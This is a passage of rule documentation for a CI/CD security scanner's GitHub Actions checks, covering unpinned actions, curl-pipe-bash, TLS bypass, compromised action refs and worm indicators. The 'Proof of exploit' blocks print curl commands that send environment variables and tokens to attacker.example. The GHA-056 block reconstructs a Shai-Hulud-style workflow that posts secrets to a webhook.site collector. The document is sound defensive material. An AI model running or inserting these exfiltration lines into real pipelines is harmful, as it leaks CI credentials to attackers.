**How this is detected.** Without an `environment:` binding, a deploy job can't be gated by required reviewers, deployment-branch policies, or wait timers. Any push to the triggering branch will deploy immediately.

**Recommendation.** Add `environment: <name>` to jobs that deploy. Configure required reviewers, wait timers, and branch-protection rules on the matching GitHub environment.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Known false positives.**

- Integration-test jobs that run ``terraform apply`` or ``kubectl apply`` against a local mock (LocalStack, Moto, kind, k3d) aren't real deploys. The rule auto-suppresses a step whose env carries ``AWS_ENDPOINT_URL`` or ``KUBE_API_URL`` pointing at a localhost address.

**Source:** [`GHA-014`](../providers/github.md#gha-014) in the [GitHub Actions provider](../providers/github.md).

### `GHA-016`: Remote script piped to shell interpreter <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-gha-016 }

**Evidences:** [`ING-1`](#ctrl-ing-1) L1: Use package managers trusted by your organization.

**How this is detected.** Two shapes fire:

1. **Curl-pipe.** ``curl | bash``, ``wget | sh``, and the shell-subshell / python-inline / download-exec / PowerShell variants documented in ``_primitives/remote_script_exec``. An attacker who controls the remote endpoint (or poisons DNS / CDN) gains arbitrary code execution in the CI runner.
2. **Trusted-installer (Codecov 2021 shape).** A job downloads an executable from a non-vendor host (``curl -o``, ``wget -O``, ``curl > file``) AND any subsequent step in the same job runs that file (``./file`` invocation or ``chmod +x`` setup). Fires even when the body verifies a SHA256 checksum or GPG signature, because the original Codecov compromise modified the uploader BEFORE the publisher's CI signed it. The carve-out is an upstream-attested provenance reference in the same job: ``slsa-verifier``, ``gh attestation verify``, or ``cosign verify-attestation``. Vendor-allowlisted hosts (``rustup.rs``, ``get.docker.com``, etc.) are skipped here the same way the curl-pipe pass skips them.

**Recommendation.** Download the script to a file, verify its checksum, then execute it. Or vendor the script into the repository. For third-party installers (Codecov / similar), a SHA256 check + GPG signature is NOT enough on its own — the Codecov 2021 incident shipped a malicious uploader that was signed by the publisher's own (compromised) CI pipeline. Pin the binary to an upstream-attested provenance reference (``slsa-verifier verify-artifact``, ``gh attestation verify``, ``cosign verify-attestation``) or pin a specific release digest, not just any signature.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Known false positives.**

- Established vendor installers (get.docker.com, sh.rustup.rs, bun.sh/install, awscli.amazonaws.com, cli.github.com, ...) ship via HTTPS from their own CDN and are idiomatic. This rule defaults to LOW confidence so CI gates can ignore them with --min-confidence MEDIUM; the finding still surfaces so teams that want cryptographic verification can audit.

**Seen in the wild.**

- [Codecov Bash uploader compromise](https://about.codecov.io/security-update/) (April 2021): an attacker modified the codecov.io/bash uploader script (commonly fetched via ``curl -s codecov.io/bash | bash``) to exfiltrate environment variables from CI runners (AWS keys, GitHub tokens, signing keys) at thousands of customers for over two months before discovery.
- [event-stream](https://github.com/dominictarr/event-stream/issues/116) (November 2018) and the [ua-parser-js compromise](https://github.com/faisalman/ua-parser-js/issues/536) (October 2021): npm-side examples of the same primitive. When the CI runner executes bytes a third party can swap out (via `curl | bash`, an unpinned `npm install`, or a compromised maintainer account), the attacker controls what runs with the runner's credentials in scope. Pinning a digest or vendoring a frozen copy turns a perpetual ambient risk into a one-time review.

**Proof of exploit.**

```
# Vulnerable: install script piped straight to bash.
steps:
  - run: curl -sL https://example.com/install.sh | bash

# Attack: an attacker who controls the install.sh endpoint
# (compromised CDN, expired domain, BGP hijack, account
# takeover, or simply being the upstream maintainer with bad
# intent) drops a payload that runs in the CI runner with
# every secret available to the job:
#
#   #!/usr/bin/env bash
#   # legitimate-looking install actions...
#   curl -X POST https://attacker.example/exfil \
#     -d "$(env)" -d "$(cat $GITHUB_TOKEN_FILE 2>/dev/null)"
#
# The runner has no way to know the bytes changed.

# Safe: download, verify a known-good digest, then execute.
steps:
  - run: |
      curl -sLo install.sh https://example.com/install.sh
      echo "abc123...expected_sha256  install.sh" | sha256sum -c
      bash install.sh
```

**Source:** [`GHA-016`](../providers/github.md#gha-016) in the [GitHub Actions provider](../providers/github.md).

### `GHA-017`: Docker run with insecure flags (privileged/host mount) <span class="pg-sev pg-sev--critical">CRITICAL</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-gha-017 }

**Evidences:** [`ING-1`](#ctrl-ing-1) L1: Use package managers trusted by your organization.

**How this is detected.** Flags like `--privileged`, `--cap-add`, `--net=host`, or host-root volume mounts (`-v /:/`) in a workflow give the container full access to the runner, enabling container escape and lateral movement.

**Recommendation.** Remove --privileged and --cap-add flags. Use minimal volume mounts. Prefer rootless containers.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`GHA-017`](../providers/github.md#gha-017) in the [GitHub Actions provider](../providers/github.md).

### `GHA-018`: Package install from insecure source <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-gha-018 }

**Evidences:** [`ING-1`](#ctrl-ing-1) L1: Use package managers trusted by your organization.

**How this is detected.** Detects package-manager invocations that use plain HTTP registries (`--index-url http://`, `--registry=http://`) or disable TLS verification (`--trusted-host`, `--no-verify`) in a workflow. These patterns allow man-in-the-middle injection of malicious packages.

Carve-out: third-party binary installers that download over HTTPS (no insecure registry, no TLS bypass) are GHA-016's trusted-installer shape, not GHA-018's. ``greylag-ci/cicd-goat`` scenario 19 fetches a Codecov-style uploader from a non-vendor HTTPS endpoint, verifies a SHA256 checksum and GPG signature, and runs the binary; GHA-018 deliberately doesn't fire (the source is HTTPS), GHA-016 does (the Codecov-2021 lesson).

**Recommendation.** Use HTTPS registry URLs. Remove --trusted-host and --no-verify flags. Pin to a private registry with TLS.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Proof of exploit.**

```
# Vulnerable: pip resolves and downloads packages over
# plaintext HTTP, so any network attacker between the
# runner and the registry (compromised proxy, malicious
# VPN exit, BGP hijack on an internal mirror) can swap a
# wheel for a malicious one whose ``setup.py`` runs at
# install time. ``--trusted-host`` then silences the very
# error that would have caught the swap.
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@<sha>
      - run: |
          pip install \
            --index-url http://internal-pypi.example.com/simple \
            --trusted-host internal-pypi.example.com \
            -r requirements.txt

# Safe: HTTPS with the registry's certificate validated.
# If the internal index uses a private CA, install the CA
# into the runner trust store, never ``--trusted-host`` or
# ``--no-verify``.
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@<sha>
      - run: |
          sudo cp ./ci/internal-ca.crt /usr/local/share/ca-certificates/
          sudo update-ca-certificates
      - run: |
          pip install \
            --index-url https://internal-pypi.example.com/simple \
            --require-hashes -r requirements.txt
```

**Source:** [`GHA-018`](../providers/github.md#gha-018) in the [GitHub Actions provider](../providers/github.md).

### `GHA-020`: No vulnerability scanning step <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-gha-020 }

**Evidences:** [`SCA-1`](#ctrl-sca-1) L1: Scan OSS for known vulnerabilities.

**How this is detected.** Without a vulnerability scanning step, known-vulnerable dependencies ship to production undetected. The check recognizes trivy, grype, snyk, npm audit, yarn audit, safety check, pip-audit, osv-scanner, and govulncheck.

**Recommendation.** Add a vulnerability scanning step, trivy, grype, snyk test, npm audit, pip-audit, or osv-scanner. Publish results so vulnerabilities surface before deployment.

**Source:** [`GHA-020`](../providers/github.md#gha-020) in the [GitHub Actions provider](../providers/github.md).

### `GHA-021`: Package install without lockfile enforcement <span class="pg-sev pg-sev--medium">MEDIUM</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-gha-021 }

**Evidences:** [`UPD-1`](#ctrl-upd-1) L1: Update vulnerable OSS manually (pin + track versions).

**How this is detected.** Detects package-manager install commands that do not enforce a lockfile or hash verification. Without lockfile enforcement the resolver pulls whatever version is currently latest, exactly the window a supply-chain attacker exploits.

**Recommendation.** Use lockfile-enforcing install commands: `npm ci` instead of `npm install`, `pip install --require-hashes -r requirements.txt`, `yarn install --frozen-lockfile`, `bundle install --frozen`, and `go install tool@v1.2.3`.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`GHA-021`](../providers/github.md#gha-021) in the [GitHub Actions provider](../providers/github.md).

### `GHA-022`: Dependency update command bypasses lockfile pins <span class="pg-sev pg-sev--medium">MEDIUM</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-gha-022 }

**Evidences:** [`UPD-2`](#ctrl-upd-2) L3: Enable automated OSS updates (Dependabot / Renovate).

**How this is detected.** Detects `pip install --upgrade`, `npm update`, `yarn upgrade`, `bundle update`, `cargo update`, `go get -u`, and `composer update`. These commands bypass lockfile pins and pull whatever version is currently latest. Tooling upgrades (`pip install --upgrade pip`) are exempted.

**Recommendation.** Remove dependency-update commands from CI. Use lockfile-pinned install commands (`npm ci`, `pip install -r requirements.txt`) and update dependencies via a dedicated PR workflow (e.g. Dependabot, Renovate).

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Known false positives.**

- Common build-tool bootstrapping idioms (``pip install --upgrade pip``, ``pip install --upgrade setuptools wheel virtualenv``) and security-tool installs (``pip install --upgrade pip-audit / cyclonedx-bom / semgrep``) are exempted by the ``DEP_UPDATE_RE`` tooling allowlist. Other tooling-upgrade idioms not yet on the list can still trip the rule. Defaults to MEDIUM confidence so CI gates can require ``--min-confidence HIGH`` to ignore.

**Source:** [`GHA-022`](../providers/github.md#gha-022) in the [GitHub Actions provider](../providers/github.md).

### `GHA-023`: TLS / certificate verification bypass <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-gha-023 }

**Evidences:** [`UPD-1`](#ctrl-upd-1) L1: Update vulnerable OSS manually (pin + track versions).

**How this is detected.** Detects patterns that disable TLS certificate verification: `git config http.sslVerify false`, `NODE_TLS_REJECT_UNAUTHORIZED=0`, `npm config set strict-ssl false`, `curl -k`, `wget --no-check-certificate`, `PYTHONHTTPSVERIFY=0`, and `GOINSECURE=`. Disabling TLS verification allows MITM injection of malicious packages, repositories, or build tools.

**Recommendation.** Remove TLS verification bypasses. Fix certificate issues at the source (install CA certificates, configure proper trust stores) instead of disabling verification.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Proof of exploit.**

```
# Vulnerable: every git fetch in the job ignores certificate
# validity. An attacker on the same network (corporate proxy,
# hostile WiFi at a remote-dev's home, compromised mirror)
# returns a MITM-substituted clone of the dependency. The
# downstream build runs the attacker's code with the
# workflow's full secret + token set in scope.
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@<sha>
      - run: git config --global http.sslVerify false
      - run: git clone https://internal.example.com/lib.git
      - run: ./build

# Safe: install the missing CA chain so verification succeeds.
# If the upstream really uses a private CA, ship its root in
# the runner image rather than disabling verification for
# every host the job talks to.
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@<sha>
      - run: |
          sudo cp ./ci/internal-ca.crt /usr/local/share/ca-certificates/
          sudo update-ca-certificates
      - run: git clone https://internal.example.com/lib.git
      - run: ./build
```

**Source:** [`GHA-023`](../providers/github.md#gha-023) in the [GitHub Actions provider](../providers/github.md).

### `GHA-024`: No SLSA provenance attestation produced <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-gha-024 }

**Evidences:** [`REB-4`](#ctrl-reb-4) L4: Digitally sign SBOMs produced (attested provenance).

**How this is detected.** Provenance generation is distinct from signing. A signed artifact proves ``who`` published it; a provenance attestation proves ``where/how`` it was built. Consumers can then verify the build happened on a trusted runner, from a specific source commit, with known parameters. Without it, a leaked signing key forges identity but a leaked build environment also forges provenance. You need both for the SLSA L3 non-falsifiability guarantee.

**Recommendation.** Call ``slsa-framework/slsa-github-generator`` or ``actions/attest-build-provenance`` after the build step to emit an in-toto attestation alongside the artifact. ``cosign sign`` alone (covered by GHA-006) signs the artifact but doesn't record *how* it was built. SLSA Build L3 requires the provenance statement.

**Source:** [`GHA-024`](../providers/github.md#gha-024) in the [GitHub Actions provider](../providers/github.md).

### `GHA-025`: Reusable workflow not pinned to commit SHA <span class="pg-sev pg-sev--high">HIGH</span> { #detail-gha-025 }

**Evidences:** [`UPD-1`](#ctrl-upd-1) L1: Update vulnerable OSS manually (pin + track versions).

**How this is detected.** A reusable workflow runs with the caller's ``GITHUB_TOKEN`` and secrets by default. If ``uses: org/repo/.github/workflows/release.yml@v1`` resolves to an attacker-modified commit, their code executes with your repository's permissions. This is the same threat model as unpinned step actions (GHA-001) but over a different ``uses:`` surface.

**Recommendation.** Pin every ``jobs.<id>.uses:`` reference to a 40-char commit SHA (``owner/repo/.github/workflows/foo.yml@<sha>``). Tag refs (``@v1``, ``@main``) can be silently repointed by whoever controls the callee repository.

**Proof of exploit.**

```
# Vulnerable: a tag reference can be silently repointed by
# whoever controls the callee repo. If
# ``org/release-tools/.github/workflows/release.yml@v1`` is
# later force-pushed (or the ``v1`` tag deleted and re-
# created against a different commit), every caller that
# inherits secrets runs the new code with their own token
# and secret set in scope on the next workflow run.
jobs:
  release:
    uses: org/release-tools/.github/workflows/release.yml@v1
    secrets: inherit

# Safe: pin to a 40-char commit SHA. The trailing comment
# documents which tag / version the SHA was at so version
# bumps stay reviewable. Dependabot's ``github-actions``
# ecosystem updates these in PRs like any other dep.
jobs:
  release:
    uses: org/release-tools/.github/workflows/release.yml@0123456789abcdef0123456789abcdef01234567  # v1.4.2
    secrets: inherit
```

**Source:** [`GHA-025`](../providers/github.md#gha-025) in the [GitHub Actions provider](../providers/github.md).

### `GHA-027`: Workflow contains indicators of malicious activity <span class="pg-sev pg-sev--critical">CRITICAL</span> { #detail-gha-027 }

**Evidences:** [`SCA-3`](#ctrl-sca-3) L2: Scan OSS for malware.

**How this is detected.** Distinct from the hygiene checks. GHA-016 flags ``curl | bash`` as a risky default; this rule fires only on concrete indicators, reverse shells, base64-decoded execution, known miner binaries or pool URLs, exfil-channel domains, credential-dump pipes, history-erasure commands. Categories reported: ``obfuscated-exec``, ``reverse-shell``, ``crypto-miner``, ``exfil-channel``, ``credential-exfil``, ``audit-erasure``.

**Recommendation.** Treat this as a potential pipeline compromise. Inspect the matching step(s), identify the author and the PR that introduced them, rotate any credentials the workflow has access to, and audit CloudTrail/AuditLogs for exfil. If the match is a legitimate red-team exercise, whitelist via ``.pipelinecheckignore`` with an ``expires:`` date, never a permanent suppression.

**Known false positives.**

- Security-training repositories, CTF challenges, and red-team exercise workflows legitimately contain reverse-shell strings or exfil domains as literals. Matches inside YAML keys / HCL attributes whose names contain ``example``, ``fixture``, ``sample``, ``demo``, or ``test`` are auto-suppressed; bare lines in a production workflow still fire.
- Defaults to LOW confidence. Filter with ``--min-confidence MEDIUM`` to ignore all matches; the rule still surfaces the hit for teams that want to spot-check.

**Source:** [`GHA-027`](../providers/github.md#gha-027) in the [GitHub Actions provider](../providers/github.md).

### `GHA-029`: Package install bypasses registry integrity (git / path / tarball source) <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-gha-029 }

**Evidences:** [`ING-1`](#ctrl-ing-1) L1: Use package managers trusted by your organization.

**How this is detected.** Package installs that pull from ``git+…`` without a pinned commit, from a local path (``./dir``, ``file:…``, absolute paths), or from a direct tarball URL are invisible to the normal lockfile integrity controls. A moving branch head, a sibling checkout the build assumes exists, or a tarball whose hash isn't verified all give an attacker who controls any of those surfaces the ability to substitute code into the build.

**Recommendation.** Pin git dependencies to a commit SHA (``pip install git+https://…/repo@<sha>``, ``cargo install --git … --rev <sha>``). Publish private packages to an internal registry instead of installing from a filesystem path or tarball URL.

**Source:** [`GHA-029`](../providers/github.md#gha-029) in the [GitHub Actions provider](../providers/github.md).

### `GHA-040`: Action reference matches a known-compromised SHA or tag <span class="pg-sev pg-sev--critical">CRITICAL</span> { #detail-gha-040 }

**Evidences:** [`ING-3`](#ctrl-ing-3) L1: Have the capability to deny-list specific vulnerable / malicious OSS, [`SCA-3`](#ctrl-sca-3) L2: Scan OSS for malware.

**How this is detected.** Walks every workflow's ``steps[].uses:`` and ``jobs.<id>.uses:`` references against the curated compromised-action registry in ``pipeline_check.core.checks.github._compromised_actions``. Match is case-insensitive on owner / repo and exact on the ``ref`` value (commit SHA or tag name). Registry is deliberately small and append-only — refresh by PR with the citing advisory in the commit message; no fetch-from-network registry to avoid taking on a telemetry surface.

**Recommendation.** Rotate every secret that may have been reachable to a workflow run that hit the compromised reference, then update the ``uses:`` reference to a known-clean SHA published by the upstream maintainer post-incident (usually announced in the advisory body). Audit CI logs for the affected window for any sign that the malicious payload ran against this repo.

**Known false positives.**

- The registry covers only public, advisory-confirmed compromises. Pre-disclosure compromises and yet-unpublished maintainer-account takeovers do not land until the citing CVE / GHSA exists. Pair with GHA-001 (SHA pinning) and GHA-025 (tag-rewrite detection) for the prevention angle.

**Seen in the wild.**

- tj-actions/changed-files compromise ([CVE-2025-30066](https://www.cve.org/CVERecord?id=CVE-2025-30066), March 2025): the canonical case the registry was built for. Roughly 23,000 tag-pinned repos shipped CI secrets to an exfiltration endpoint over a ~24-hour window before GitHub blocked the malicious commits.
- reviewdog/action-setup compromise ([CVE-2025-30154](https://www.cve.org/CVERecord?id=CVE-2025-30154), March 2025): same week as tj-actions; smaller blast radius but identical mechanism. Tag-pinned consumers were affected; SHA-pinned consumers who happened to match the malicious commit were also affected.

**Proof of exploit.**

```
# Vulnerable: pinned to a SHA the attacker landed under @v45.
# (Substitute the actual malicious-commit SHA from the CVE-2025-30066
# advisory; the registry in _compromised_actions.py carries it.)
- uses: tj-actions/changed-files@<advisory-malicious-sha>

# Same applies to tag pins that resolved to the malicious
# commit during the compromise window:
- uses: tj-actions/changed-files@v45     # WAS pointing at the bad commit

# Attack: the injected action body exfiltrated CI secrets by
# dumping the runner process environment to a controlled host:
#   curl -X POST https://attacker.example/exfil \
#     -d "$(cat /proc/self/environ)"
#
# Every workflow run that hit one of those refs over the
# compromise window leaked the entire env block, including
# ${{ secrets.* }} and GITHUB_TOKEN.

# Safe: pin to the post-incident clean SHA the maintainer
# republished in the advisory (consult the GHSA the registry
# cites for the exact value):
- uses: tj-actions/changed-files@<advisory-clean-sha>
```

**Source:** [`GHA-040`](../providers/github.md#gha-040) in the [GitHub Actions provider](../providers/github.md).

### `GHA-041`: Action upstream repo has a single contributor <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-gha-041 }

**Evidences:** [`ING-3`](#ctrl-ing-3) L1: Have the capability to deny-list specific vulnerable / malicious OSS.

**How this is detected.** Reads the contributor count from ``ctx.action_metadata[owner/repo].contributor_count`` (populated by the ``--resolve-remote`` path; the GitHub REST ``/contributors`` endpoint, capped at two entries — the rule only cares about == 1). When the fetch failed or the flag is off, the rule passes silently. Forks and archived repos that ALSO have a single contributor fire the rule; the fork / archived state is part of the same supply-chain risk story.

**Recommendation.** Audit the action repo's contributor list. If the repo genuinely has one maintainer, pin to a vendored fork under your org's control (so a future compromise on the upstream doesn't reach your build runtime) or move to a first-party action covering the same surface. The single-maintainer pattern is what made tj-actions / reviewdog one-day compromises so widely-blast.

**Known false positives.**

- Some well-maintained single-author actions (high-quality personal-account repos that the maintainer simply hasn't open-sourced governance for) are not actually compromised. Suppress via ignore-file when a security review has confirmed the maintainer's identity and 2FA posture.

**Seen in the wild.**

- tj-actions / reviewdog March 2025 compromises (CVE-2025-30066 / CVE-2025-30154): both upstream repos had a single primary contributor at the time of compromise. The single-maintainer pattern was central to the blast radius (no second pair of eyes on the malicious commit, no auto-rollback when the tag move landed).

**Source:** [`GHA-041`](../providers/github.md#gha-041) in the [GitHub Actions provider](../providers/github.md).

### `GHA-042`: Action upstream repo is newly created <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-gha-042 }

**Evidences:** [`ING-3`](#ctrl-ing-3) L1: Have the capability to deny-list specific vulnerable / malicious OSS.

**How this is detected.** Reads ``created_at`` from ``ctx.action_metadata[owner/repo]`` (populated by the ``--resolve-remote`` path). Fires when the repo's age in days is below ``MIN_AGE_DAYS`` (90). Without the opt-in flag the rule passes silently with a nudge.

**Recommendation.** Verify the action repo is the real upstream and not a typosquat. Compare the spelling and owner against the intended action (``actions/checkout`` vs ``actoins/checkout``); check the repo description, stars, and prior releases. If the action is genuinely new but trusted, suppress via ignore-file with a dated note; the suppression decays naturally as the repo ages past the 90-day threshold.

**Known false positives.**

- Newly-released first-party actions from a trusted org (say, a freshly-launched ``actions/foo`` rolled out by GitHub itself) fire while they're still young. Suppress via ignore-file with a dated note; the entry expires naturally once the repo crosses the age threshold.

**Seen in the wild.**

- GitGuardian / StepSecurity typosquat reports (2023-2024) document several action-naming impersonations that appeared as newly-registered repos and reached production CI before the legitimate owner was notified.

**Source:** [`GHA-042`](../providers/github.md#gha-042) in the [GitHub Actions provider](../providers/github.md).

### `GHA-043`: Low-star action runs with sensitive permissions <span class="pg-sev pg-sev--high">HIGH</span> { #detail-gha-043 }

**Evidences:** [`ING-3`](#ctrl-ing-3) L1: Have the capability to deny-list specific vulnerable / malicious OSS.

**How this is detected.** Reads ``stargazers_count`` from ``ctx.action_metadata[owner/repo]`` and the effective ``permissions:`` block (job-level wins; falls back to workflow-top-level; falls back to the caller's inherited block for resolved reusable workflows). Fires when stars < ``MAX_STARS`` (25) AND any of 'contents', 'packages', 'id-token', 'actions', 'deployments' is set to ``write`` on the calling job. ``permissions: write-all`` is treated as all scopes set to write.

**Recommendation.** Either narrow the calling job's ``permissions:`` to the minimum the action actually needs (drop ``contents: write`` / ``id-token: write`` / ``packages: write`` / ``actions: write`` / ``deployments: write`` unless the action's documented surface requires them), or replace the action with a community-reviewed alternative. The rule fires the COMBINATION of low community review and elevated permissions; either side alone is fine.

**Known false positives.**

- Internal first-party actions hosted in a private org repo legitimately have low public star counts; their threat model is different and the rule does not distinguish internal from third-party. Suppress via ignore-file when the action is in-org and trusted.

**Seen in the wild.**

- GitGuardian 2023 supply-chain audit: a handful of low-popularity actions with ``contents: write`` were weaponized via single-PR maintainer-impersonation compromises; the elevated permission was the privilege amplifier that let the attacker push code back to the victim's default branch on the same workflow run.

**Source:** [`GHA-043`](../providers/github.md#gha-043) in the [GitHub Actions provider](../providers/github.md).

### `GHA-047`: Action ref resolves to a recently committed tag or SHA <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-gha-047 }

**Evidences:** [`ING-3`](#ctrl-ing-3) L1: Have the capability to deny-list specific vulnerable / malicious OSS.

**How this is detected.** Reads ``ref_committed_at`` from ``ctx.action_metadata[owner/repo]`` (populated by the ``--resolve-remote`` path via ``GET /repos/{owner}/{repo}/commits/{ref}``). Fires when the referenced ref's commit date is younger than ``MIN_REF_AGE_DAYS`` (7). Trusted publishers (``actions``, ``aws-actions``, ``azure``, ...) are skipped by default to avoid firing on legitimate retags of floating majors; pin to a SHA to opt those back in. Without ``--resolve-remote`` the rule passes silently with a discovery nudge.

**Recommendation.** Wait until the referenced tag or commit has had time to be reviewed by the upstream community before pulling it into CI. The default cooldown is seven days. Either bump the pinned ref to an older release, or wait 7 days and re-run. If the action is internal / first-party and the freshness gate is unwanted, pin to a 40-char commit SHA — SHA pins don't move under a retag and are the preferred long-term mitigation.

**Known false positives.**

- A legitimate first-party action that's outside the default trusted-publisher allowlist (a small vendor org that publishes a real action; you'd like it included) will fire after every release for the cooldown window. Either pin to a SHA (preferred) or suppress via ignore-file with a dated note; the suppression decays once the ref ages past the threshold.

**Seen in the wild.**

- Multiple action-tag compromises (ua-parser-js npm 2021, tj-actions/changed-files 2025) followed the same shape: a tag was re-pointed at a malicious commit and consumers pulling on the next CI run executed the payload. Cooldown gating turns the community-detection window into a defense.

**Source:** [`GHA-047`](../providers/github.md#gha-047) in the [GitHub Actions provider](../providers/github.md).

### `GHA-051`: services / container image is not pinned by digest <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-gha-051 }

**Evidences:** [`UPD-1`](#ctrl-upd-1) L1: Update vulnerable OSS manually (pin + track versions).

**How this is detected.** Walks ``jobs.<id>.services.<name>.image`` and ``jobs.<id>.container.image`` (the two places a GitHub-hosted runner pulls a third-party image at job start). Flags any reference that isn't pinned by ``@sha256:<digest>``: bare tags (``postgres:16``), ``latest``, no-tag (``redis``), and ``mcr.microsoft.com/dotnet/sdk:8.0``-style tag pins all fail.

Complements DF-001 (Dockerfile ``FROM`` pinning), GHA-001 (action ``uses:`` pinning), and GHA-040 (known-compromised action refs). Where those catch your own code pulling a third party, GHA-051 catches the *runner* pulling a third-party image to host the workflow alongside your code — same trust shape, different ingress.

**Recommendation.** Replace every ``services.<name>.image:`` (and the same field on a job-level ``container:`` block) with a ``<image>@sha256:<digest>`` reference. The services / container runs alongside the workflow on the same runner and sees the same secret environment, so a swapped sidecar image is the same shape of attack as a swapped action: arbitrary code on the runner under the workflow's identity. Use a registry that returns immutable digests (``docker buildx imagetools inspect`` resolves a tag to a digest), pin to that digest, then re-pin on the next intentional upgrade — exactly the workflow GHA-001 already documents for ``uses: actions/...@<sha>``.

**Known false positives.**

- Workflows that pull from an org-internal private registry where the registry itself enforces image immutability sometimes pin by tag deliberately. The safer pattern is still ``@sha256:``: the registry's immutability is a separate trust boundary you'd need to audit, while a digest pin is self-verifying. Suppress with a rationale that names the registry and the audit channel.

**Source:** [`GHA-051`](../providers/github.md#gha-051) in the [GitHub Actions provider](../providers/github.md).

### `GHA-056`: Workflow body contains a known supply-chain worm indicator <span class="pg-sev pg-sev--critical">CRITICAL</span> { #detail-gha-056 }

**Evidences:** [`ING-3`](#ctrl-ing-3) L1: Have the capability to deny-list specific vulnerable / malicious OSS, [`SCA-3`](#ctrl-sca-3) L2: Scan OSS for malware.

**How this is detected.** Distinct from GHA-027 (which fires on behavioral primitives, reverse shells, base64-decoded exec, exfil-channel domains) and from GHA-048 / GHA-049 (which fire on the *write* or *push* primitives). GHA-056 fires on the *literal IOC* — the filenames, repo names, and webhook UUIDs that surfaced in the published worm payloads. Currently covers:

* ``shai-hulud-workflow.yml`` — the workflow file the Shai-Hulud worm dropped into every writable repo.
* Webhook UUID ``bb8ca5f6-4175-45d2-b042-fc9ebb8170b7`` — the Shai-Hulud webhook.site collector path.
* ``Shai-Hulud`` / ``Shai-Hulud Migration`` — the public exfil repo names the worm created under each victim's account.
* ``s1ngularity-repository*`` — the Nx-attack public exfil repo name pattern.

The IOC list is curated and append-only, mirroring the shape of ``_compromised_actions.py`` / ``_compromised_packages.py``. Refresh by PR with the vendor advisory cited in the commit.

**Recommendation.** Treat this workflow as already-compromised, not at-risk. A literal worm IOC in the YAML means either the file was written by a worm payload (Shai-Hulud / s1ngularity), or someone hard-coded the IOC for a reason that needs a paper trail. Required steps: (1) preserve the file, do not just revert it; (2) rotate every credential the runner can reach (GITHUB_TOKEN-scoped + every secret referenced anywhere in ``.github/``); (3) audit GitHub audit log for the time window between the IOC appearing and the rotation completing; (4) check the org for sibling repos with the same IOC (the worm propagated). If the literal is intentional (a detection fixture, a red-team exercise), suppress with ``.pipelinecheckignore`` carrying an ``expires:`` date — never permanently.

**Known false positives.**

- Security-training repositories, CTF challenges, and red-team exercise workflows legitimately carry these IOC strings as literals. Matches inside YAML keys / HCL attributes whose names contain ``example``, ``fixture``, ``sample``, ``demo``, or ``test`` are auto-suppressed; bare literals in a production workflow still fire.
- Detection / threat-intel repos that maintain IOC lists in checked-in YAML are the expected source of legitimate hits. Suppress on the specific file with a rationale that names the repo's purpose.

**Seen in the wild.**

- Shai-Hulud npm worm (Sept 2025): the worm wrote ``.github/workflows/shai-hulud-workflow.yml`` into every repo the stolen GITHUB_TOKEN could reach; the dropped workflow then POSTed harvested secrets to ``webhook.site/bb8ca5f6-4175-45d2-b042-fc9ebb8170b7`` and pushed a sibling copy into a public ``Shai-Hulud`` repo under the victim's account.
- Nx s1ngularity compromise (Aug 2025): the malicious postinstall pushed harvested secrets to public ``s1ngularity-repository*`` repos created under the victim's account via ``gh repo create``.

**Proof of exploit.**

```
# Vulnerable: the IOC strings below are literal Shai-Hulud /
# s1ngularity indicators. A workflow containing any of them
# is post-compromise evidence, not pre-compromise risk.
name: shai-hulud
on: push
jobs:
  exfil:
    runs-on: ubuntu-latest
    steps:
      - run: |
          curl -X POST \
            https://webhook.site/bb8ca5f6-4175-45d2-b042-fc9ebb8170b7 \
            -d @<(env)
          gh repo create "$USER/s1ngularity-repository-$RANDOM" --public
          git push "$USER/Shai-Hulud-Migration" main

# Safe: there is no legitimate version of this workflow.
# Delete it, rotate every credential the runner can reach,
# and audit the org for sibling drops.
```

**Source:** [`GHA-056`](../providers/github.md#gha-056) in the [GitHub Actions provider](../providers/github.md).

### `GHA-057`: Secret-scanner output sent to network egress <span class="pg-sev pg-sev--critical">CRITICAL</span> { #detail-gha-057 }

**Evidences:** [`SCA-3`](#ctrl-sca-3) L2: Scan OSS for malware.

**How this is detected.** Three shapes fire:

